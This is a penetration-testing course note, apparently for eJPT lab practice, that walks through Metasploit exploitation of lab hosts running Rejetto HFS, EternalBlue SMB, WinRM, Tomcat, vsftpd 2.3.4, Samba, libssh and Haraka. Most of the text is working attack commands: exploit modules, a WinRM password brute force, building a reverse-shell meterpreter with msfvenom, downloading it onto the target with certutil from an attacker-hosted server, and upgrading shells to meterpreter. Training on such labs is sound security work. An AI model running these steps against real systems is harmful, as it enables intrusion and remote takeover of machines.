# ðŸ”¬ Exploitation

## Windows Exploitation

### ðŸ”¬ HFS (HTTP File Server) <a href="#hfs-http-file-server" id="hfs-http-file-server"></a>

A **HFS** (HTTP File Server) is a file and documents sharing web server.

* Rejetto HFS - free open source HTTP file server

> ðŸ”¬ [Windows: HTTP File Server](https://attackdefense.com/challengedetails?cid=1945)
>
> * Target IP: 10.0.17.144
> * Exploit the target with the appropriate Metasploit Framework module
> * [Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution](https://www.exploit-db.com/exploits/39161)

```bash
service postgresql start && msfconsole -q
msf5 > db_status
msf5 > set RHOSTS 10.0.17.144
msf5 > workspace -a HFS
```

* Perform an `nmap` scan directly into MSF

```bash
msf5 > db_nmap -sS -sV -O 10.0.17.144
```

<figure><img src="../../../../.gitbook/assets/image (225).png" alt=""><figcaption></figcaption></figure>

```bash
msf5 > search rejetto
msf5 > use exploit/windows/http/rejetto_hfs_exec
msf5 > info
msf5 > run
```

<figure><img src="../../../../.gitbook/assets/image (226).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (228).png" alt=""><figcaption></figcaption></figure>

* Type of payload can be changed base on the target O.S. architecture

```bash
msf5 > set payload windows/x64/meterpreter/reverse_tcp
msf5 > options
msf5 > run
```

```sh
shell
cd /
dir
type flag.txt
```

<figure><img src="../../../../.gitbook/assets/image (229).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
Flag: `f74c8347798f4082daf4b4570dba094a`
{% endhint %}

### ðŸ”¬ SMB - MS17-010 EternalBlue <a href="#hfs-http-file-server" id="hfs-http-file-server"></a>

* [CVE-2017-0144](https://nvd.nist.gov/vuln/detail/CVE-2017-0144)
* [EternalBlue VA](https://blog.syselement.com/ine/courses/ejpt/assessment-methodologies/4-va#eternalblue)
  * **EternalBlue** takes advantage of a Windows SMBv1 protocol vulnerability
  * Patch was released in March 2017

> ðŸ”¬ Check the [Lab 2 - Eternal Blue here](../system-host-based-attack/windows-operating-system/smb.md)

* Some MSF useful commands from my Home Lab (`Kali VM + Win 2008_R2 Server`)

```bash
service postgresql start && msfconsole -q
```

```bash
db_status
setg RHOSTS <Target IP>
setg RHOST <Target IP>
workspace -a EternalBlue

db_nmap -sS -sV -O <Target IP>
```

```bash
search type:auxiliary EternalBlue
use auxiliary/scanner/smb/smb_ms17_010
options
run

search type:exploit EternalBlue
use exploit/windows/smb/ms17_010_eternalblue
options
run
```

### ðŸ”¬ WinRM <a href="#hfs-http-file-server" id="hfs-http-file-server"></a>

* Identify WinRM users with MSF and exploit WinRM by obtaining access credentials.
* Default WinRM HTTP port is **`5985`** and HTTPS **`5986`**

> [ðŸ”¬ WinRM Attack la](../system-host-based-attack/windows-operating-system/winrm.md)

```bash
service postgresql start && msfconsole -q
```

```bash
db_status
setg RHOSTS <Target IP>
setg RHOST <Target IP>
workspace -a WinRM

db_nmap -sS -sV -O -p- <Target IP>
# Port 5985 is set up for WinRM
```

```bash
search type:auxiliary winrm
use auxiliary/scanner/winrm/winrm_auth_methods
options
run

# Brute force WinRM login
search winrm_login
use auxiliary/scanner/winrm/winrm_login
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

search winrm_cmd
use auxiliary/scanner/winrm/winrm_cmd
set USERNAME administrator
set PASSWORD tinkerbell
set CMD whoami
run
```

### ðŸ”¬ Apache Tomcat <a href="#hfs-http-file-server" id="hfs-http-file-server"></a>

[**`Apache Tomcat`**](https://tomcat.apache.org/) is a free open source Java servlet web server, _build to host dynamic websites and web apps developed in **Java**_.

* Tomcat default TCP port is **`8080`**
* Apache web server host HTML/PHP web apps, instead
* Apache Tomcat < **`v.8.5.23`** is vulnerable to a Java Service Page (JSP) Upload Bypass / RCE

> ðŸ”¬ [Windows: Java Web Server](https://attackdefense.com/challengedetails?cid=1948)
>
> * Target IP: `10.0.30.237`
> * Exploit the target with the appropriate Metasploit Framework module
> * [Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution](https://www.exploit-db.com/exploits/42966)

```bash
service postgresql start && msfconsole -q
msf5 > db_status 
msf5 > setg RHOSTS 10.0.30.237
msf5 > workspace -a TOMCAT
```

* Perform `nmap` scan directly into MSF

```bash
msf5 > db_nmap -sS -sV -O 10.0.30.237
```

<figure><img src="../../../../.gitbook/assets/image (49) (1).png" alt=""><figcaption></figcaption></figure>

Try tomcat from a browser

* `http://10.2.24.113:8080/`

<figure><img src="../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```bash
msf5 > services
msf5 > search type:exploit tomcat_jsp
msf5 > use exploit/multi/http/tomcat_jsp_upload_bypass
msf5 > info
msf5 > check
msf5 > run
```

<figure><img src="../../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Or use a specific payload

```bash
cd /
type flag.txt
```

```bash
msf5 > set payload java/jsp_shell_bind_tcp
msf5 > options
msf5 > set SHELL cmd
msf5 > run
```

<figure><img src="../../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
Flag: `92d60a06d0ea2179c9a8c442c0bd0bc0`
{% endhint %}

* Obtain a `Meterpreter` session

```bash
background
sessions
```

* Generate a Windows `meterpreter` payload. Open a new terminal tab

```bash
ip -br -c a

msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.2 LPORT=1234 -f exe > meterpreter.exe
```

```bash
sudo python3 -m http.server 80
```

* In the first `msfconsole` tab

```bash
sessions
sessions 3

certutil -urlcache -f http://10.10.16.2/meterpreter.exe meterpreter.exe
```

* Terminate the python web server and set up the handler in the second tab

```bash
vim handler.rc
# Insert the following lines

use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.18.2
set LPORT 1234
run

# Save it and exit
```

```bash
msfconsole -r handler.rc
```

* Execute the `meterpreter.exe` on the target system

```bash
.\meterpreter.exe
```

* Reverse `Meterpreter` session will be opened.

***

## Linux Exploitation

### ðŸ”¬ FTP <a href="#ftp-1" id="ftp-1"></a>

[**`vsftpd`**](https://security.appspot.com/vsftpd.html) is an Unix FTP server.

* vsftpd **`v.2.3.4`** is vulnerable to a command execution vulnerability

> ðŸ”¬ [Vulnerable FTP Server](https://www.attackdefense.com/challengedetailsnoauth?cid=179)
>
> * Target IP: `192.34.57.3`
> * Exploit the target with the appropriate Metasploit Framework module
> * [vsftpd 2.3.4 - Backdoor Command Execution](https://www.exploit-db.com/exploits/49757)

```bash
ip -br -c a
service postgresql start && msfconsole -q
```

```bash
msf5 > db_status 
msf5 > setg RHOSTS 192.34.57.3
msf5 > workspace -a TOMCAT
```

* Perform an nmap scan directly into MSF

```bash
msf5 > db_nmap -sS -sV -O 192.34.57.3
```

<figure><img src="../../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```bash
msf5 > search vsftpd
msf5 > options
msf5 > run
```

```bash
/bin/bash -i
```

<figure><img src="../../../../.gitbook/assets/image (6) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Shell to `Meterpreter` post exploitation

```bash
msf5 > background
msf5 > sessions
msf5 > search shell_to_meterpreter
msf5 > use post/multi/manage/shell_to_meterpreter
msf5 > set SESSION 1
msf5 > set LHOST eth1
msf5 > run
# error with meterpreter sessions but it's actived
# run the meterpreter session again
msf5 > sessions
msf5 > sessions 3
```

<figure><img src="../../../../.gitbook/assets/image (7) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### ðŸ”¬ SAMBA <a href="#samba" id="samba"></a>

**`Samba`** is the Linux implementation of SMB.

* Samaba **`v.3.5.0`** is vulnerable to a RCE vulnerability

> ðŸ”¬ [Vulnerable File Sharing Service](https://www.attackdefense.com/challengedetails?cid=178)
>
> * Target IP: `192.234.251.3`
> * Exploit the target with the appropriate Metasploit Framework module
> * [Samba 3.5.0 - Remote Code Execution](https://www.exploit-db.com/exploits/42060)

```bash
ip -br -c a
service postgresql start && msfconsole -q
```

```bash
msf5 > db_status 
msf5 > setg RHOSTS 192.158.109.3
msf5 > workspace -a samba3.5.0
```

* Perform an nmap scan directly into MSF

```bash
msf5 > db_nmap -sS -sV -O 192.158.109.3
```

<figure><img src="../../../../.gitbook/assets/image (8) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```bash
msf5 > search type:exploit name:samba
msf5 > use exploit/linux/samba/is_known_pipename
msf5 > info
msf5 > options
msf5 > check
msf5 > run
```

<figure><img src="../../../../.gitbook/assets/image (9) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Shell to `Meterpreter` post exploitation

```bash
msf5 > background # or CTRL+Z
msf5 > sessions
msf5 > search shell_to_meterpreter
msf5 > use post/multi/manage/shell_to_meterpreter
msf5 > set SESSION 1
msf5 > set LHOST eth1
msf5 > run

msf5 > sessions
msf5 > sessions 2
```

<figure><img src="../../../../.gitbook/assets/image (11) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (10) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### ðŸ”¬ SSH <a href="#ssh-1" id="ssh-1"></a>

**`libssh`** is a C library that implements the SSHv2 protocol

* **`SSH`** default TCP port is **`22`**
* libssh **`v.0.6.0 - 0.8.0`** is vulnerable to an authentication bypass vulnerability

> ðŸ”¬ [Vulnerable SSH server](https://www.attackdefense.com/challengedetails?cid=448)
>
> * Target IP: `192.158.109.3`
> * Exploit the target with the appropriate Metasploit Framework module
> * [libssh Exploitdb](https://www.exploit-db.com/search?q=libssh)
> * [libssh Authentication Bypass Scanner](https://www.rapid7.com/db/modules/auxiliary/scanner/ssh/libssh\_auth\_bypass/)

```bash
ip -br -c a
service postgresql start && msfconsole -q
```

```bash
msf5 > db_status 
msf5 > setg RHOSTS 192.158.109.3
msf5 > workspace -a libssh
```

* Perform an nmap scan directly into MSF

```bash
msf5 > db_nmap -sS -sV -O 192.158.109.3
```

<figure><img src="../../../../.gitbook/assets/image (12) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```bash
msf5 > search libssh_auth_bypass
msf5 > options
msf5 > set SPAWN_PTY true
msf5 > run

msf5 > sessions
msf5 > sessions 1
```

<figure><img src="../../../../.gitbook/assets/image (13) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Enumerate some information

```bash
id
cat /etc/*release
uname -r
```

<figure><img src="../../../../.gitbook/assets/image (14) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Shell to `Meterpreter` post exploitation

```bash
msf5 > background # or CTRL+Z
msf5 > search shell_to_meterpreter
msf5 > use post/multi/manage/shell_to_meterpreter
msf5 > set SESSION 1
msf5 > set LHOST eth1
msf5 > run

msf5 > sessions
msf5 > sessions 2
```

```bash
meterpreter > sysinfo
meterpreter > getuid
```

<figure><img src="../../../../.gitbook/assets/image (15) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### ðŸ”¬ SMTP <a href="#smtp-1" id="smtp-1"></a>

[**`Haraka`**](https://haraka.github.io/) is an open source high performance SMTP server developed in `Node.js`

* **`SMTP`** default TCP port is **`25`**
  * other TCP ports are **`465`** and **`587`**
* Haraka prior to **`v.2.8.9`** is vulnerable to command injection

> ðŸ”¬ [Vulnerable SMTP Server](https://www.attackdefense.com/challengedetails?cid=715)
>
> * Target IP: `192.83.7.3`
> * Exploit the target with the appropriate Metasploit Framework module
> * [Haraka < 2.8.9 - Remote Command Execution](https://www.exploit-db.com/exploits/41162)

```bash
ip -br -c a
service postgresql start && msfconsole -q
```

```bash
msf5 > db_status 
msf5 > setg RHOSTS 192.83.7.3
msf5 > workspace -a SMTP_haraka
```

* Perform an nmap scan directly into MSF

```bash
msf5 > db_nmap -sS -sV -O 192.83.7.3
```

<figure><img src="../../../../.gitbook/assets/image (16) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```bash
msf5 > search type:exploit name:haraka
msf5 > use exploit/linux/smtp/haraka
msf5 > info
msf5 > options
msf5 > set SRVPORT 9898
msf5 > set email_to root@attackdefense.test
msf5 > set payload linux/x64/meterpreter_reverse_http
msf5 > set LHOST eth1
msf5 > set LPORT 8080
msf5 > run

# This is a NON-staged payload
```

<figure><img src="../../../../.gitbook/assets/image (17) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (18) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>





